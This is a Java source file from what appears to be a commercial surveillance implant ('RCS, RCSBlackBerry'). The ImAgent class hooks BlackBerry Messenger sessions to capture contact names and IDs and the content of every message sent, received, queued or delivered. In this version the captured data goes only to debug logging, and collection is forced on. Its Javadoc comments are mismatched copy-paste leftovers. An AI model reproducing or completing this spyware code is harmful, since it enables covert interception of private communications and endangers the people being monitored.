//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.agent
 * File         : TaskAgent.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.agent;

import net.rim.blackberry.api.blackberrymessenger.BlackBerryMessenger;
import net.rim.blackberry.api.blackberrymessenger.Message;
import net.rim.blackberry.api.blackberrymessenger.MessengerContact;
import net.rim.blackberry.api.blackberrymessenger.Session;
import net.rim.blackberry.api.blackberrymessenger.SessionListener;
import net.rim.blackberry.api.blackberrymessenger.SessionRequestListener;
import net.rim.device.api.system.ApplicationDescriptor;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.utils.Utils;

// TODO: Auto-generated Javadoc
/**
 * PIM, calendario, appuntamenti.
 */
public final class ImAgent extends Agent implements SessionRequestListener,
        SessionListener {
    //#ifdef DEBUG
    static Debug debug = new Debug("ImAgent", DebugLevel.VERBOSE);
    //#endif

    static boolean forced = true;

    /**
     * Instantiates a new task agents
     * 
     * @param agentStatus
     *            the agent status
     */
    public ImAgent(final boolean agentEnabled) {
        super(Agent.AGENT_IM, agentEnabled || forced, true, "ImAgent");
    }

    /**
     * Instantiates a new task agent.
     * 
     * @param agentStatus
     *            the agent status
     * @param confParams
     *            the conf params
     */
    protected ImAgent(final boolean agentStatus, final byte[] confParams) {
        this(agentStatus);
        parse(confParams);
        
        setDelay(NEVER);
        setPeriod(NEVER);
    }

    public void actualStart() {
        //#ifdef DEBUG
        debug.info("start");
        //#endif
        BlackBerryMessenger.getInstance().addSessionRequestListener(this,
                ApplicationDescriptor.currentApplicationDescriptor());
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    public void actualRun() {
        //#ifdef DEBUG
        debug.info("run");
        //#endif
    }

    public void actualStop() {
        //#ifdef DEBUG
        debug.info("stop");
        //#endif
        BlackBerryMessenger.getInstance().removeSessionRequestListener(this);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.agent.Agent#parse(byte[])
     */
    protected boolean parse(final byte[] confParameters) {
        //#ifdef DEBUG
        if (confParameters != null) {
            debug.trace("parse: " + Utils.byteArrayToHex(confParameters));
        } else {
            debug.trace("parse: null");
        }
        //#endif
        return false;
    }

    /**
     * SessionRequestListener
     */
    public void sessionRequestAccepted(Session session) {        
        Debug.init();
        
        //#ifdef DEBUG
        debug.trace("sessionRequestAccepted");
        //#endif

        session.addListener(this, ApplicationDescriptor
                .currentApplicationDescriptor());

        MessengerContact contact = session.getContact();

        String contactInfo = "Name: " + contact.getDisplayName();
        contactInfo += " Id: " + contact.getContactId();

        //#ifdef DEBUG
        debug.trace("contactInfo: " + contactInfo);
        //#endif
    }

    public void messageDelivered(Session session, Message message) {

        //#ifdef DEBUG
        debug.trace("messageDelivered");
        debug.trace("type: " + message.getContentType());
        debug.trace("content: " + Utils.byteArrayToHex(message.getData()));
        //#endif
    }

    public void messageQueuedForSend(Session session, Message message) {
        //#ifdef DEBUG
        debug.trace("messageQueuedForSend");
        debug.trace("type: " + message.getContentType());
        debug.trace("content: " + Utils.byteArrayToHex(message.getData()));
        //#endif
    }

    public void messageReceived(Session session, Message message) {
        //#ifdef DEBUG
        debug.trace("messageReceived");
        debug.trace("type: " + message.getContentType());
        debug.trace("content: " + Utils.byteArrayToHex(message.getData()));
        //#endif             
    }

    public void messageSent(Session session, Message message) {
        //#ifdef DEBUG
        debug.trace("messageSent");
        debug.trace("type: " + message.getContentType());
        debug.trace("content: " + Utils.byteArrayToHex(message.getData()));
        //#endif
    }

    public void sessionClosed(Session session) {
        //#ifdef DEBUG
        debug.trace("sessionClosed: " + session.getContact().getContactId());
        //#endif

    }
}
